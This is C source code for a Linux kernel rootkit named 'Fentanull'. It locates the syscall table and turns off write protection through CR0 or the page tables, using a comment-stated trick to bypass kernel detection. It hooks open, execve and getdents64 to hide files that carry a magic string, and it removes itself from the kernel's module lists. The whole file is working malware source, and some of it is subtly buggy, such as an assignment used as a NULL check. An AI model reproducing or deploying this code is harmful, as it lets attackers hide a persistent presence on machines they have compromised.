#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>  
#include <linux/unistd.h>
#include <linux/moduleparam.h>
#include <asm/paravirt.h>   
#include <asm/pgtable.h>    
#include <linux/fcntl.h> 
#include <linux/uaccess.h> /* for copy_from_user */ 
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <linux/preempt.h>
#include <linux/notifier.h>
#include "consts.h"

/*#include "utils/keylogger.c"*/

MODULE_AUTHOR("cow");
MODULE_LICENSE("GPL");

struct fentanull_info 
{ 
	int mod;  
	int files; 
};
struct linux_dirent64
{ 
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen; 
	unsigned char	d_type; 
	char		d_name[0];
};

struct linux_dirent
{ 
	unsigned long	d_ino; 
	unsigned long 	d_off; 
	unsigned short	d_reclen; 
	char		d_name[1];
};

static unsigned long *sys_call_table; 
static pte_t *pte; 
static struct fentanull_info hidden; 
static int hook_type; 

typedef asmlinkage long (*old_openat_type)(int dirfd, const char *pathname, int flags, mode_t mode);
typedef asmlinkage long (*old_open_type)(const char *pathname, int flags, mode_t mode); 
typedef asmlinkage long (*old_execve_type)(const char *filename, char *const argv[], char *const envp[]);
typedef asmlinkage long (*old_kill_type)(pid_t pid, int sig); 
typedef asmlinkage long (*old_getdents_type)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
typedef asmlinkage long (*old_getdents64_type)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

old_open_type old_open; 
old_openat_type old_openat;
old_execve_type old_execve; 
old_kill_type old_kill; 
old_getdents64_type old_getdents64; 

module_param(hook_type, int, S_IRUSR);

/* the kernel will know if WP in cr0 has been modified in write_cr0, 
 * so we need to create our own vesion to bypass the detection */

inline void custom_write_cr0(unsigned long cr0)
{ 
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void cr0_enable(int mode)
{ 
	switch(mode)
	{
		case 1: 
		{
			preempt_disable();
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 & (~0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); 
			#endif 	
			break;
		}
		case 0: 
		{	
			preempt_enable();
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 | (0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); 
			#endif
			break;
		}
	}
	return;
} 

static inline void pte_enable(int mode)
{ 
	unsigned int lvl; 
	switch(mode)
	{ 
		case 1: 
		{ 

			pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
			pte->pte |= _PAGE_RW; 
			break;
		}
		case 0:
		{ 
			pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
			pte->pte &= ~_PAGE_RW;
			break;
		}
	}
}
void mod_hide(void)
{ 
	/* removing fentanull from procfs and sysfs */ 
	list_del(&THIS_MODULE->list); 
	kobject_del(&THIS_MODULE->mkobj.kobj); 
	THIS_MODULE->sect_attrs = NULL; 
	THIS_MODULE->notes_attrs = NULL; 
	hidden.mod = 1; 
}

/*========== EXECVE ============ */

asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *const envp[])
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: execve hooked\n");
	#endif 
	if ((hidden.mod & hidden.files) == 1)
		return old_execve(filename, argv, envp);
	else 
	{
		char *kfilename; 
		kfilename = (char *)kmalloc(256, GFP_KERNEL); 
		copy_from_user(kfilename, filename, 255); 
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk[execve][1]: %s", kfilename);
		printk(KERN_ALERT "[-] rk[execve][2]: %s", filename);
		#endif
		if (strstr(kfilename, MAGICSTR)!=NULL)
		{ 
			#ifdef DEBUG 
			printk(KERN_ALERT "[-] rk: hiding file"); 
			#endif 
			kfree(kfilename);
			return -ENOENT; 
		}
		else 
		{
			kfree(kfilename);
			return old_execve(filename, argv, envp);
		}
	}
} 

/*========== OPEN ============ */

asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: open called\n"); 
	#endif
	if ((hidden.mod & hidden.files) == 1)
		return old_open(pathname, flags, mode); 
	else {
		char *kpathname; 
		kpathname = (char *)kmalloc(PATH_MAX, GFP_KERNEL);
		copy_from_user(kpathname, pathname, PATH_MAX);
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk[open][1]: %s", kpathname);
		printk(KERN_ALERT "[-] rk[open][2]: %s", pathname);
		#endif
		if (strstr(kpathname, MAGICSTR)!=NULL)
		{
			#ifdef DEBUG 
			printk(KERN_ALERT "[-] rk: hiding file\n");
			#endif
			kfree(kpathname);
			return -ENOENT;
		}
		else
		{
			kfree(kpathname);
			return old_open(pathname, flags, mode);
		}
	}
}

/*========== OPENAT ============ */
asmlinkage int fentanull_openat(int dirfd, const char *pathname, int flags, mode_t mode)
{ 
	/* For some reason, the original hook completely breaks my Arch installation but works fine on Lxubuntu. Will investigate later. */
	return old_openat(dirfd, pathname, flags, mode);
}

asmlinkage fentanull_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: getdents64 called\n"); 
	#endif
	int i = 0;
	struct linux_dirent64 *entry, *kdirent; 
	int ret = old_getdents64(fd, dirp, count);
	entry = dirp; 
	kdirent = kzalloc(ret, GFP_KERNEL); 
	if (kdirent = NULL)
		return ret; 
	if (ret <= 0)
		return ret;
       	if (entry->d_name == NULL)
		return ret; 	
	while (i < ret)
	{ 
		if ((strstr(entry->d_name, MAGICSTR)) != NULL)
		{
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk: hiding file\n"); 
			#endif
			int reclen = entry->d_reclen; 
			char *nextrec = (char *)entry + reclen; 
			int len = (int)dirp + ret - (int)nextrec; 
			memmove(entry, nextrec, len); 
			ret -= reclen; 
			continue;
		}
		i += entry->d_reclen; 
		entry = (struct linux_dirent64*) ((char *)dirp + i);
	}
	kfree(kdirent);
	return ret; 
}

/*=========== HOOKS ========== */

void set_openat(int hook)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: hooking openat");
		#endif
		old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
		sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
		printk(KERN_ALERT "[-] rk: openat hooked\n");
		#endif
	}
	else
	{

		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: unhooking openat\n"); 
		#endif 
		sys_call_table[__NR_openat] = (unsigned long)old_openat;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
		printk(KERN_ALERT "[-] rk: openat unhooked\n");
		#endif
	}
	
}

void set_open(int hook)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		old_open = (old_open_type)sys_call_table[__NR_open]; 
		sys_call_table[__NR_open] = (unsigned long)fentanull_open;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
		printk(KERN_ALERT "[-] rk: open hooked\n");
		#endif
	}
	else
	{

		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: unhooking open\n"); 
		#endif 
		sys_call_table[__NR_open] = (unsigned long)old_open;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
		printk(KERN_ALERT "[-] rk: open unhooked\n");
		#endif
	}
	
}

void set_execve(int hook)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: hooking execve");
		#endif
		old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
		sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
		printk(KERN_ALERT "[-] rk: execve hooked\n");
		#endif
	}
	else
	{

		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: unhooking execve\n"); 
		#endif 
		sys_call_table[__NR_execve] = (unsigned long)old_execve;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
		printk(KERN_ALERT "[-] rk: execve unhooked\n");
		#endif
	}
	
}

void set_getdents64(int hook)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: hooking getdents64");
		#endif
		old_getdents64 = (old_getdents64_type)sys_call_table[__NR_getdents64]; 
		sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
		printk(KERN_ALERT "[-] rk: getdents64 hooked\n");
		#endif
	}
	else
	{

		#ifdef DEBUG 
		printk(KERN_ALERT "[-] rk: unhooking getdents64\n"); 
		#endif 
		sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
		printk(KERN_ALERT "[-] rk: getdents64 unhooked\n");
		#endif
	}
}


static int __init fentanull_init(void)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: Fentanull initialized.\n");
	#endif
	memset(&hidden, 0x0, sizeof(hidden));
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
	if (sys_call_table == NULL)
	{ 
		#ifdef DEBUG
		printk(KERN_ERR "[!] rk: sys_call_table == NULL.\n"); 
		#endif 
		return -1; 
	}
	else 
	{
		/* comment this out for debugging */ 
		mod_hide(); 
		if (hook_type == 1)
		{
			cr0_enable(1);

			//set_openat(1); 
			set_open(1); 
			set_execve(1); 
			set_getdents64(1);

			cr0_enable(0);
			return 0;	
		}       
		else if (hook_type == 0)
		{
			pte_enable(1);
			//set_openat(1); 
			set_open(1); 
			set_execve(1); 
			set_getdents64(1);

			pte_enable(0);
			return 0;
		}
		else 
			return -1;
	}
}


static void __exit fentanull_exit(void)
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: Fentanull is exiting...\n"); 
	#endif 
	if (hook_type == 1)
	{
		cr0_enable(1);
		set_execve(0); 
		set_open(0); 
		//set_openat(0); 	
		set_getdents64(0);
		cr0_enable(0);
	}
	else if (hook_type == 0)
	{
		pte_enable(1);
		set_execve(0); 
		set_open(0); 
		//set_openat(0); 	
		set_getdents64(0);
		pte_enable(0);
	}
} 

module_init(fentanull_init);
module_exit(fentanull_exit);
